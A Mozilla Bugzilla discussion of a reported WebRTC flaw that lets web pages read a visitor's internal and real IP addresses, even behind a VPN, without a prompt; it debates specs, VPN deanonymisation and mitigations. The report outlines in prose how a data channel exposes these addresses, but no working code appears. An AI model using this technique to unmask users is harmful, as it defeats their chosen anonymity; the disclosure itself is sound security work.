* Comments Only

|  | [cghwong](/user_profile?user_id=495629)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=959893#c0)• 11 years ago |
|  | |

Attached file
[fftest.html](attachment.cgi?id=8360137)
— [Details](attachment.cgi?id=8360137&action=edit)

User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0 (Beta/Release)
Build ID: 20131205075310
Steps to reproduce:
Reported By:
Jaap Karan Singh and Colin Wong, BAE Systems Detica
Firefox attempts to prevent internal IP address leakage via the SDP offer description by requiring streams to be added to a RTC peer connection before createOffer() can be called. This is usually done through calling getUserMedia(), which requires user authorisation. Firefox also prevents MediaStream constructors from being called directly. However, a RTC data channel bypasses this requirement by creating a stream without any user prompts, as no access to camera or microphone is requested.
Please see the attached fftest.html file for an example. It will write out the SDP description into the page, which contains all identified IP addresses for the endpoint so that a P2P connection can be established. The peer.localDescription object can also be inspected in the console.
Actual results:
Internal IP addresses can be leaked to the web page without any user notification.
Expected results:
The root question here is whether the browser should be able to initiate and establish P2P connections without notifying the user. Based on other WebRTC behaviour implemented in Firefox, it appears that this was to be prevented so that internal IP addresses cannot be leaked to a web page without calling getUserMedia() and causing a user prompt. In any case, the WebRTC implementation should be made consistent with whatever is decided.

|  | [Christoph Diehl [:posidron]](/user_profile?user_id=368570) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a130_368570)• 11 years ago |

Component: Untriaged → WebRTCProduct: Firefox → Core

|  | [Paul Theriault [:pauljt] (no longer reading bugmail)](/user_profile?user_id=434339) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=959893#c1)• 11 years ago |
|  | |

I've see this discussed publicly on twitter and elsewhere, and there are public demos so I don't think we need to keep this hidden. (e.g. <http://net.ipcalf.com/>)
I wonder if the peerconnection spec says anything about this?Group: core-securityStatus: UNCONFIRMED → NEWEver confirmed: true

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=959893#c2)• 11 years ago |
|  | |

This is by design:
<http://tools.ietf.org/html/draft-ietf-rtcweb-security-arch-07#section-5.4>

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=959893#c3)• 11 years ago |
|  | |

ekr: how are we meeting any of the MUST requirements in that section?
\* MUST provide a mechanism to allow the JS to suppress ICE negotiation
... until the user has decided to answer the call
\* MUST provide a mechanism for the calling application JS to indicate
that only TURN candidates are to be used.
There isn't even any user-visible way to disable WebRTC entirely for people who are concerned, none of the buried prefs are surfaced to the UI. If people are using a VPN/proxy for privacy reasons they have no reason to suspect we've added a feature that blows a hole in that. We've violated the "No Surprises" rule (and probably the same-origin policy in some people's mind: the peer connection is not same-origin with the page running the script).
The following example was mailed to security@ this morning and making the rounds on twitter
<http://bric.lepus.uberspace.de/ff28Fail.html>
Note that the LAN address (e.g. 192.168.\*) is not the biggest concern, but that when trying to preserve some anonymity by using a VPN the user's real IP address is exposed in addition to the LAN IP and the VPN's IPs.
[status-firefox28](/buglist.cgi?f1=cf_status_firefox28&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox28&o1=equals&v1=affected)
[status-firefox29](/buglist.cgi?f1=cf_status_firefox29&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox29&o1=equals&v1=affected)
[status-firefox30](/buglist.cgi?f1=cf_status_firefox30&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox30&o1=equals&v1=affected)
[tracking-firefox29](/buglist.cgi?f1=cf_tracking_firefox29&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox29&o1=equals&v1=%2B)
[tracking-firefox30](/buglist.cgi?f1=cf_tracking_firefox30&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox30&o1=equals&v1=%2B)
[tracking-firefox31](/buglist.cgi?f1=cf_tracking_firefox31&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox31&o1=equals&v1=%2B)Flags: needinfo?(ekr)Keywords: [csectype-disclosure](/buglist.cgi?keywords=csectype-disclosure&resolution=---),
[privacy](/buglist.cgi?keywords=privacy&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---),
[sec-want](/buglist.cgi?keywords=sec-want&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a6382933_1689)• 11 years ago |

Keywords: [sec-high](/buglist.cgi?keywords=sec-high&resolution=---) → [sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=959893#c4)• 11 years ago |
|  | |

(In reply to Daniel Veditz [:dveditz] from [comment #3](/show_bug.cgi?id=959893#c3 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> ekr: how are we meeting any of the MUST requirements in that section?
>
> \* MUST provide a mechanism to allow the JS to suppress ICE negotiation
> ... until the user has decided to answer the call
This is straightforward. The JS simply doesn't do SetRemote() until its
ready. It's not awesome, but it will work. We could certainly do better.
> \* MUST provide a mechanism for the calling application JS to indicate
> that only TURN candidates are to be used.
We do not do this. However, note that both of these are about allowing
the site to build an anonymous calling service, not about concealing the
user's IP address from the site. So, these requirements are important
but the site isn't required to use this facility.
> There isn't even any user-visible way to disable WebRTC entirely for people
> who are concerned, none of the buried prefs are surfaced to the UI. If
> people are using a VPN/proxy for privacy reasons they have no reason to
> suspect we've added a feature that blows a hole in that. We've violated the
> "No Surprises" rule (and probably the same-origin policy in some people's
> mind: the peer connection is not same-origin with the page running the
> script).
>
> The following example was mailed to security@ this morning and making the
> rounds on twitter
>
> <http://bric.lepus.uberspace.de/ff28Fail.html>
>
> Note that the LAN address (e.g. 192.168.\*) is not the biggest concern, but
> that when trying to preserve some anonymity by using a VPN the user's real
> IP address is exposed in addition to the LAN IP and the VPN's IPs.
For context, the way that ICE works is that you gather all the addresses
that you know about and communicate them to the other side. These addresses
are gathered in roughly three ways:
- Looking at the addresses of your local interfaces (which includes VPN tunnels)
- Determining what addresses sites on the public internet see you coming in from.
- Explicitly setting up relay channels to public relays on the Internet.
The reason for doing this is that you don't know in advance what the path between
us and the counterparty is. So, consider the case where you and I are on the
same network and yet behind a NAT. We obviously don't want to send the data out
to the public internet and then back (this may not even work) we just want to send
it directly. In order for that to work, we need to provide our local IP address
to the other side, and that means it's available to the site. We could certainly
add browser controls to refuse to provide the local IP address as one of the ICE
candidates, but actually frobbing those controls would have a seriously negative
impact on performance.
WRT the specific question of VPNs, it might be possible for us to determine when
VPNs are in use and suppress all local addresses that aren't tied to the VPN.
This would presumably require some system-specific code and might even depend
on exactly how the VPN was installed. If, for instance, the VPN just overrides
the default route, then that may be hard to distinguish from the ordinary routing
situation.
Certainly we could also provide a clearer UI gizmo to disable WebRTC entirely.Flags: needinfo?(ekr)

|  | [ABri](/user_profile?user_id=502378) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=959893#c5)• 11 years ago |
|  | |

Only to set this into the right perspective:
There are two issues:
1. reveil of internal LAN IPs
2. deanonymizing VPN/Proxy access
i guess from a network admin security perspective no 1 is of certain importance.
But taking into account that people that use Firefox with VPN/Proxy have a high interest in not becoming chased by somebody/authorities/regimes no 2 is the real threat here. The actual situation is, that they feel secure (Firefox plus VPN/Proxy) but can be tracked instantly on any site they visit resp. by javascript injection on the wire.
Therefore - to keep the security image of firefox fighting for pricacy up - a hard wired user consent (with notifying them of the demascing risk) before starting the peerconnection to perform the STUN server request is needed.
This solution would even be better than going with about:config webRTC Y/N, because users might forget about their actual settings.

|  | [Randell Jesup [:jesup] (needinfo me)](/user_profile?user_id=11539) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=959893#c6)• 11 years ago |
|  | |

Revealing internal LAN IPs (of almost all devices on your local net) can be done without use of WebRTC. WebRTC may expose the local LAN address of the browser more easily, but often this can be guessed from the scan of other LAN addresses.
As a feature, requiring user consent for every PeerConnection would make the feature largely unusable for the intended usecases. Having Firefox (and WebRTC) be cognizant of running in VPN/privacy mode would go a long way to making this work without walling off functionality for the normal case. Other things might well be gated off such a setting as well to improve privacy.
Use of a VPN for anonymity is an important usecase for Firefox, but one that's used by a tiny fraction of users. If we can't detect it directly/automatically, a "UsingVPN" setting and an extension(s) to provide a UI element to enable/disable (and/or which knows how to probe for a specific VPN(s) in use) would be useful. It's slightly less clear that the intent of an general HTTP proxy is and what impact that should have on WebRTC.
It should also be easy to build an extension to Firefox that adds a permission prompt to all PeerConnection requests (perhaps with the option to filter certain candidates, or limit all candidates to TURN).

|  | [Richard Barnes [:rbarnes]](/user_profile?user_id=373085) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=959893#c7)• 11 years ago |
|  | |

(In reply to Randell Jesup [:jesup] from [comment #6](/show_bug.cgi?id=959893#c6 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> Revealing internal LAN IPs (of almost all devices on your local net) can be
> done without use of WebRTC. WebRTC may expose the local LAN address of the
> browser more easily, but often this can be guessed from the scan of other
> LAN addresses.
>
> As a feature, requiring user consent for every PeerConnection would make the
> feature largely unusable for the intended usecases. Having Firefox (and
> WebRTC) be cognizant of running in VPN/privacy mode would go a long way to
> making this work without walling off functionality for the normal case.
> Other things might well be gated off such a setting as well to improve
> privacy.
>
> Use of a VPN for anonymity is an important usecase for Firefox, but one
> that's used by a tiny fraction of users. If we can't detect it
> directly/automatically, a "UsingVPN" setting and an extension(s) to provide
> a UI element to enable/disable (and/or which knows how to probe for a
> specific VPN(s) in use) would be useful. It's slightly less clear that the
> intent of an general HTTP proxy is and what impact that should have on
> WebRTC.
>
> It should also be easy to build an extension to Firefox that adds a
> permission prompt to all PeerConnection requests (perhaps with the option to
> filter certain candidates, or limit all candidates to TURN).
This is about right. Since we can't distinguish VPN interfaces from non-VPN interfaces, the only thing we can do is disable local candidates entirely. Seems like a reasonable thing to be controlled with an about:config pref, which could be set either manually or by something like TOR Browser.

|  | [Randell Jesup [:jesup] (needinfo me)](/user_profile?user_id=11539) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=959893#c8)• 11 years ago |
|  | |

I think that if you are using a VPN for anonymity, it makes a lot of sense for that to be as explicit as possible and surfaced to the browser. I wouldn't be surprised if there are other things one wishes to tie to this.

|  | [Patrick McManus [:mcmanus]](/user_profile?user_id=32546) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=959893#c9)• 11 years ago |
|  | |

indeed, this seems like a hard to satisfy corner case of [https://bugzilla.mozilla.org/show\_bug.cgi?id=354493](/show_bug.cgi?id=354493 "NEW - Mitigate CSRF attacks against internal networks (block rfc 1918 local addresses from non-local addresses)") (which is already hard to satisfy).. sworkman is going to take a crack at least improving the situation.

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=959893#c10)• 11 years ago |
|  | |

Incidentally, based on conversations with Justin Uberti, I believe Chrome behaves much the same way we do.
Incidentally, RFC 5245 explicitly considers the case of VPNs and says you should downprioritize them:
<https://tools.ietf.org/html/rfc5245#section-4.1.2.2>
One criterion for selection of the type and local preference values
is the use of a media intermediary, such as a TURN server, VPN
server, or NAT. With a media intermediary, if media is sent to that
candidate, it will first transit the media intermediary before being
received. Relayed candidates are one type of candidate that involves
a media intermediary. Another are host candidates obtained from a
VPN interface. When media is transited through a media intermediary,
it can increase the latency between transmission and reception. It
can increase the packet losses, because of the additional router hops
that may be taken. It may increase the cost of providing service,
since media will be routed in and right back out of a media
intermediary run by a provider. If these concerns are important, the
type preference for relayed candidates SHOULD be lower than host
candidates. The RECOMMENDED values are 126 for host candidates, 100
for server reflexive candidates, 110 for peer reflexive candidates,
and 0 for relayed candidates. Furthermore, if an agent is multihomed
and has multiple IP addresses, the local preference for host
candidates from a VPN interface SHOULD have a priority of 0.

|  | [Randell Jesup [:jesup] (needinfo me)](/user_profile?user_id=11539) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=959893#c11)• 11 years ago |
|  | |

(In reply to Eric Rescorla (:ekr) from [comment #10](/show_bug.cgi?id=959893#c10 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> Incidentally, based on conversations with Justin Uberti, I believe Chrome
> behaves much the same way we do.
>
> Incidentally, RFC 5245 explicitly considers the case of VPNs and says you
> should downprioritize them:
Right, but I don't think that's covering the case driving this bug (anonymizing VPNs, as opposed to VPN-for-access-to-restricted-networks). For this case, we want to force either TURN or VPN access (and TURN may not be safe either) - so this is largely a "anonymizing proxy use needs to directly control what interfaces are exposed in ICE" likely via an extension, per above. For the case considered in the RFC, you want to keep the traffic off the VPN if the normal external interface is up, if possible - virtually the opposite.
(In reply to Patrick McManus [:mcmanus] from [comment #9](/show_bug.cgi?id=959893#c9 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> indeed, this seems like a hard to satisfy corner case of
> [https://bugzilla.mozilla.org/show\_bug.cgi?id=354493](/show_bug.cgi?id=354493 "NEW - Mitigate CSRF attacks against internal networks (block rfc 1918 local addresses from non-local addresses)") (which is already hard
> to satisfy).. sworkman is going to take a crack at least improving the
> situation.
The example I saw that showed you all the internal addresses on 192.168.\* that were in use didn't actually need to use WebRTC at all to gather those (i.e. a variation of the above bug).

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=959893#c12)• 11 years ago |
|  | |

(In reply to Randell Jesup [:jesup] from [comment #11](/show_bug.cgi?id=959893#c11 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Eric Rescorla (:ekr) from [comment #10](/show_bug.cgi?id=959893#c10 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > Incidentally, based on conversations with Justin Uberti, I believe Chrome
> > behaves much the same way we do.
> >
> > Incidentally, RFC 5245 explicitly considers the case of VPNs and says you
> > should downprioritize them:
>
> Right, but I don't think that's covering the case driving this bug
> (anonymizing VPNs, as opposed to VPN-for-access-to-restricted-networks).
> For this case, we want to force either TURN or VPN access (and TURN may not
> be safe either) - so this is largely a "anonymizing proxy use needs to
> directly control what interfaces are exposed in ICE" likely via an
> extension, per above. For the case considered in the RFC, you want to keep
> the traffic off the VPN if the normal external interface is up, if possible
> - virtually the opposite.
Correct. What I was trying to say is that these two cases are hard to
distinguish from the browser.
> (In reply to Patrick McManus [:mcmanus] from [comment #9](/show_bug.cgi?id=959893#c9 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > indeed, this seems like a hard to satisfy corner case of
> > [https://bugzilla.mozilla.org/show\_bug.cgi?id=354493](/show_bug.cgi?id=354493 "NEW - Mitigate CSRF attacks against internal networks (block rfc 1918 local addresses from non-local addresses)") (which is already hard
> > to satisfy).. sworkman is going to take a crack at least improving the
> > situation.
>
> The example I saw that showed you all the internal addresses on 192.168.\*
> that were in use didn't actually need to use WebRTC at all to gather those
> (i.e. a variation of the above bug).

|  | [Sylvestre Ledru [:Sylvestre]](/user_profile?user_id=495955) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=959893#c13)• 11 years ago |
|  | |

No longer tracking for 29. I don't think we are going to block the 29 release because of this bug.
[status-firefox28](/buglist.cgi?f1=cf_status_firefox28&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox28&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox28&o1=equals&v1=wontfix)
[tracking-firefox29](/buglist.cgi?f1=cf_tracking_firefox29&o1=isnotempty):
[+](/buglist.cgi?f1=cf_tracking_firefox29&o1=equals&v1=%2B) → [-](/buglist.cgi?f1=cf_tracking_firefox29&o1=equals&v1=-)

|  | [[:Aleksej]](/user_profile?user_id=197295) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a9025530_197295)• 11 years ago |

OS: Windows 7 → All

|  | [Lukas Blakk [:lsblakk] use ?needinfo](/user_profile?user_id=272375) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=959893#c14)• 11 years ago |
|  | |

We're not blocking any releases on this bug, it's a sec-want and can be nominated for uplift to whichever branches are appropriate depending on when a patch is ready.
[status-firefox31](/buglist.cgi?f1=cf_status_firefox31&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox31&o1=equals&v1=affected)
[status-firefox32](/buglist.cgi?f1=cf_status_firefox32&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox32&o1=equals&v1=affected)
[tracking-firefox30](/buglist.cgi?f1=cf_tracking_firefox30&o1=isnotempty):
[+](/buglist.cgi?f1=cf_tracking_firefox30&o1=equals&v1=%2B) → [-](/buglist.cgi?f1=cf_tracking_firefox30&o1=equals&v1=-)
[tracking-firefox31](/buglist.cgi?f1=cf_tracking_firefox31&o1=isnotempty):
[+](/buglist.cgi?f1=cf_tracking_firefox31&o1=equals&v1=%2B) → [-](/buglist.cgi?f1=cf_tracking_firefox31&o1=equals&v1=-)

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=959893#c15)• 11 years ago |
|  | |

As far as I know, we don't intend to change anything here.

|  | [[:Aleksej]](/user_profile?user_id=197295) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a14378674_197295)• 11 years ago |

Whiteboard: [fingerprinting]

|  | [alex\_mayorga](/user_profile?user_id=216181) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=959893#c18)• 10 years ago |
|  | |

Is this bug why <https://github.com/diafygi/webrtc-ips> works on Nightly?
A tad scary I must say...

|  | [Xidorn Quan [:xidorn] UTC+10](/user_profile?user_id=373403) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=959893#c19)• 10 years ago |
|  | |

(In reply to alex\_mayorga from [comment #18](/show_bug.cgi?id=959893#c18 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> Is this bug why <https://github.com/diafygi/webrtc-ips> works on Nightly?
>
> A tad scary I must say...
Actually, it has been able to work on Release since long ago...

|  | [Xidorn Quan [:xidorn] UTC+10](/user_profile?user_id=373403) |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=959893#c20)• 10 years ago |
|  | |

I think it is a critical problem, because it can provide websites a very large fingerprint without acknowlegment from users.
I remember we rejected [bug 1008453](/show_bug.cgi?id=1008453 "RESOLVED FIXED - support for navigator.hardwareConcurrency") to be implemented mostly because it exposes the number of computing cores of a machine, which is usually not that private. But here we expose much more information to the web without a corresponding concern.Severity: normal → criticalHardware: x86\_64 → AllVersion: 26 Branch → Trunk

|  | [Daniel Roesler](/user_profile?user_id=305342) |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=959893#c23)• 10 years ago |
|  | |

> The root question here is whether the browser should be able to initiate and
> establish P2P connections without notifying the user. Based on other WebRTC
> behaviour implemented in Firefox, it appears that this was to be prevented
> so that internal IP addresses cannot be leaked to a web page without calling
> getUserMedia() and causing a user prompt. In any case, the WebRTC
> implementation should be made consistent with whatever is decided.
I agree with the original poster. The best solution to this is for the user to be prompted for confirmation when createDataChannel() is called, just like when getUserMedia() is called.

|  | [Pascal Ernster](/user_profile?user_id=440713) |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=959893#c24)• 10 years ago |
|  | |

(In reply to Lukas Blakk [:lsblakk] use ?needinfo from [comment #14](/show_bug.cgi?id=959893#c14 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> We're not blocking any releases on this bug, it's a sec-want and can be
> nominated for uplift to whichever branches are appropriate depending on when
> a patch is ready.
No, this is not a sec-want, this is a bug. If you find a need to implement this facepalm of an RFC, just show ask the user, like you do before letting websites access the user's webcam, microphone or location. You added a feature that breaks my privacy, to I have to ask \*you\* to fix this \*before\* shipping release versions of Firefox with this feature enabled by default.
If a user is using a VPN or an anonymizing proxy, he cannot reasonably exepect that his browser is actively helping websites to circumvent that layer of anonymization by happily enumarating his network devices. What the heck were you thinking when implementing this \*\*\*\*? Are you also going to incorporate my CPUID or a list of the PCI IDs present on my machine into the useragent header if some idiot manages to get such a requirement in some broken RFC?!
Please stop implementing unneeded \*\*\*\* "features" without thinking them through and make Firefox a browser again. You have failed to deliver a proper UI for the user to control DOM storage for years, you have failed to think about the consequences of enabling link prefetching and DNS prefetching by default (which actually enables spammers to tell wether I have opened/read an email or not), you have failed to offer a way to enable or disable NPAPI plugins on a site-per-site basis, you have failed to offer. You have failed for years to provide users with a possibility to prevent HTTP referers from compromising their privacy. You have failed to provide users with means to mitigate the threats that cookies pose to their privacy. You have failed to implement DNSSEC and TLSA in a way that would actually help the user. You have failed to implement TLS certificate pinning. You have even failed to implement HTML5 form input types. Why the heck do you waste your time fiddling around with WebRTC?
Please stop failing at protecting your users privacy. Stop using "but Google Chrome is broken in the same way" as an excuse for implementing broken standards. If I wanted my browser to be broken the same way as Google Chrome is, I'd probably use Google Chrome instead of Firefox.
I'm really begging you, Firefox is the last browser where I have at least a minor hope the it can be brought to a state where it enables privacy concerned users to browser the web with at least \*some\* peace of mind. I don't want to have to install half a dozen extensions anymore everytime I install Firefox just to be able to browser the web without having my browser compromise my privacy.
There reason why Firefox has lost such a huge market share to Chrome is not because Chrome is so good, it is because the Mozilla devs have mad Firefox so bad over the years.
I can understand why you don't ship with features like "RequestPolicy". But where is the problem in asking the user \*before\* compromising his VPN? Where is the problem in asking the user whether he actually wants links or DNS names in his spam mails to be prefetched the moment he opens them? Where is the problem with offering users to actually edit the lists of the sites that are allowed to use Java or Flash while enabling the user to keep those plugins disabled by default? Where is the problem with keeping a list of sites that should not get to know the user's real referer when clicking a link? Where is the problem with enabling a user to prevent the browser from loading external content from tracking networks?
Why don't you care about your user's privacy anymore?

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=959893#c25)• 10 years ago |
|  | |

See:
[https://bugzilla.mozilla.org/show\_bug.cgi?id=1128296](/show_bug.cgi?id=1128296 "NEW - Add a preference to disable WebRTC entirely")

|  | [u279673](/user_profile?user_id=279673) |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=959893#c27)• 10 years ago |
|  | |

This does not only affect VPNs. My WMC TV tuner (Hauppauge DCR-2650 CableCARD) is leaking IP information as well.

|  | [u279673](/user_profile?user_id=279673) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=959893#c28)• 10 years ago |
|  | |

(In reply to Dan Q (RedBlade7) from [comment #27](/show_bug.cgi?id=959893#c27 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> This does not only affect VPNs. My WMC TV tuner (Hauppauge DCR-2650
> CableCARD) is leaking IP information as well.
VirtualBox too

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a33239641_1689)• 10 years ago |

Blocks: [1128236](/show_bug.cgi?id=1128236 "RESOLVED DUPLICATE - When on some VPN software Implementations, STUN candidates will still include your real IP address")

|  | [Randell Jesup [:jesup] (needinfo me)](/user_profile?user_id=11539) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=959893#c29)• 10 years ago |
|  | |

(In reply to Dan Q (RedBlade7) from [comment #28](/show_bug.cgi?id=959893#c28 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Dan Q (RedBlade7) from [comment #27](/show_bug.cgi?id=959893#c27 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > This does not only affect VPNs. My WMC TV tuner (Hauppauge DCR-2650
> > CableCARD) is leaking IP information as well.
>
> VirtualBox too
If you mean you see ICE/etc candidates for your connection to virtualbox or other VPN-ish links, that's totally to be expected - the browser doesn't know (so far as I know) that the "connection" is a virtual one to a VM - nor if that's really a gateway to the network or not (example: using a VM as a "dedicated" firewall). Per rbarnes above and some previous bugs, I don't think that we can reliably even tell if a connection is a VPN connection on all platforms.
I imagine the same happens on Chrome.
We're open to suggestions that don't break primary usecases.

|  | [Gunstick](/user_profile?user_id=67748) |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=959893#c30)• 10 years ago |
|  | |

As an end-user, I would at least like to have an option to turn this off/on more easily than in about:config. Here are some ideas:
Enable it on a per-site basis. I see no reason why github would want to video-chat with me. Pre-configure some sites which are well known webRTC sites, make the list editable.
Chose to disable, enable or ask:
Pop up an ask dialog if the network config seems to contain multiple IPs, which indicates then probably a user who is running VPNs or VMs, and so among the "power users". Something like: "this website uses WebRTC, which will make all your IPs known. If you run a VPN and you don't plan to do videochat on example.com. it is advisable to disable WebRTC for this site by clicking here:"
Most of the code is there, we got cookie editing, certificate lists and so on. So a list for WEBrtc would be the most appropriate solution.

|  | [u279673](/user_profile?user_id=279673) |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=959893#c31)• 10 years ago |
|  | |

(In reply to Gunstick from [comment #30](/show_bug.cgi?id=959893#c30 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> As an end-user, I would at least like to have an option to turn this off/on
> more easily than in about:config. Here are some ideas:
> Enable it on a per-site basis. I see no reason why github would want to
> video-chat with me. Pre-configure some sites which are well known webRTC
> sites, make the list editable.
We don't need a secret whitelist. This is not just about VPNs for privacy conscious people, TV tuners, or virtual machines - corporate VPNs can leak sensitive information about trade secrets.
I know one person who works for a Fortune 500 company and has to use a corporate-run VPN on a nonrechargeable laptop to prevent information from being leaked. You might want to think about dangerous situations like these.
A better idea would having WebRTC off by default and giving an "Ask To Activate" with optional "Remember for this site", just like with Flash and other plugins.

|  | [Pascal Ernster](/user_profile?user_id=440713) |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=959893#c32)• 10 years ago |
|  | |

(In reply to Dan Q (RedBlade7) from [comment #31](/show_bug.cgi?id=959893#c31 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Gunstick from [comment #30](/show_bug.cgi?id=959893#c30 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > As an end-user, I would at least like to have an option to turn this off/on
> > more easily than in about:config. Here are some ideas:
> > Enable it on a per-site basis. I see no reason why github would want to
> > video-chat with me. Pre-configure some sites which are well known webRTC
> > sites, make the list editable.
>
> We don't need a secret whitelist.
He probably didn't mean to whitelist sites, but rather something similar to the certificate store - just for WebRTC websites instead of certificate authorities.

|  | [Masatoshi Kimura [:emk]](/user_profile?user_id=5842) |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=959893#c33)• 10 years ago |
|  | |

(In reply to Randell Jesup [:jesup] from [comment #6](/show_bug.cgi?id=959893#c6 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> Revealing internal LAN IPs (of almost all devices on your local net) can be
> done without use of WebRTC.
How can?
> WebRTC may expose the local LAN address of the
> browser more easily, but often this can be guessed from the scan of other
> LAN addresses.
Content scripts from random web sites can not scan LAN addresses because of the same origin policy. WebRTC even subverts the SOP.

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=959893#c34)• 10 years ago |
|  | |

(In reply to Masatoshi Kimura [:emk] from [comment #33](/show_bug.cgi?id=959893#c33 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Randell Jesup [:jesup] from [comment #6](/show_bug.cgi?id=959893#c6 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > Revealing internal LAN IPs (of almost all devices on your local net) can be
> > done without use of WebRTC.
>
> How can?
>
> > WebRTC may expose the local LAN address of the
> > browser more easily, but often this can be guessed from the scan of other
> > LAN addresses.
>
> Content scripts from random web sites can not scan LAN addresses because of
> the same origin policy. WebRTC even subverts the SOP.
Hmm.... Please describe the attack you have in mind. Note that content scripts
actually can talk to arbitrary local LAN addresses, they just can't read the
response. And WebRTC incorporates a consent check before it lets you send
application-controlled data somewhere. So, what is it specifically you think that
WebRTC lets you do?

|  | [Xidorn Quan [:xidorn] UTC+10](/user_profile?user_id=373403) |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=959893#c35)• 10 years ago |
|  | |

(In reply to Eric Rescorla (:ekr) from [comment #34](/show_bug.cgi?id=959893#c34 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Masatoshi Kimura [:emk] from [comment #33](/show_bug.cgi?id=959893#c33 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > (In reply to Randell Jesup [:jesup] from [comment #6](/show_bug.cgi?id=959893#c6 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > > Revealing internal LAN IPs (of almost all devices on your local net) can be
> > > done without use of WebRTC.
> >
> > How can?
> >
> > > WebRTC may expose the local LAN address of the
> > > browser more easily, but often this can be guessed from the scan of other
> > > LAN addresses.
> >
> > Content scripts from random web sites can not scan LAN addresses because of
> > the same origin policy. WebRTC even subverts the SOP.
>
> Hmm.... Please describe the attack you have in mind. Note that content scripts
> actually can talk to arbitrary local LAN addresses, they just can't read the
> response.
They can talk to arbitrary local LAN addresses via XHR, but they can only collect information via checking the interval between callbacks being invoked. AFAICS, the detailed error information is not provided to the content script. However, time is a very unreliable information. In LAN, the deviation of delay of local response may even be larger than the network delay. Hence it is almost, if not completely, infeasible to detect local address via things like XHR.
In addition, it is infeasible to detect \*all\* IP addresses of a machine, because of the large address space.
> And WebRTC incorporates a consent check before it lets you send
> application-controlled data somewhere. So, what is it specifically you think
> that WebRTC lets you do?
